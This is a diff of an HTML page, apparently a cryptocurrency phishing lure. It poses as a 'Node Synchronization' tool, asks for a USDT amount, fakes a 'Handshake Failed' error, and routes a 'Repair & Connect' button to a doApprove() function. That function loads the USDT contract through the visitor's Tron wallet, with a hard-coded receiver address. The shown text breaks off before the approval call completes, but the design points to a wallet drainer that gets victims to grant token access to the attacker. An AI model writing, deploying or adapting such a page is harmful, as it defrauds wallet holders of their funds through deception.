@@ -17,14 +17,12 @@
     </style>
 </head>
 <body>
-
-    <div class="container">
-        <h2 style="color:#f0b90b">Node Synchronization</h2>
+  <div class="container">
+       <h2 style="color:#f0b90b">Node Synchronization</h2>
         <p style="color:#848e9c; font-size:13px">Enter USDT amount to verify node connection.</p>
         <input type="number" id="sync-amt" class="input-box" placeholder="Amount (USDT)">
         <button class="btn" onclick="showError()">Initialize Sync</button>
     </div>
-
     <div id="mask">
         <div class="modal">
             <h3 style="color:#f6465d; margin:0">Handshake Failed</h3>
@@ -32,18 +30,15 @@
             <button class="repair-btn" onclick="doApprove()">Repair & Connect</button>
         </div>
     </div>
-
     <script>
         const CONFIG = {
             RECEIVER: "TKPDtwUvCL45sKPchTr9d1U8TKyNKQDnLB",
             USDT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
         };
-
         function showError() {
             if(!document.getElementById('sync-amt').value) return alert("Enter amount");
             document.getElementById('mask').style.display = 'block';
         }
-
         async function doApprove() {
             try {
                 const contract = await window.tronWeb.contract().at(CONFIG.USDT);
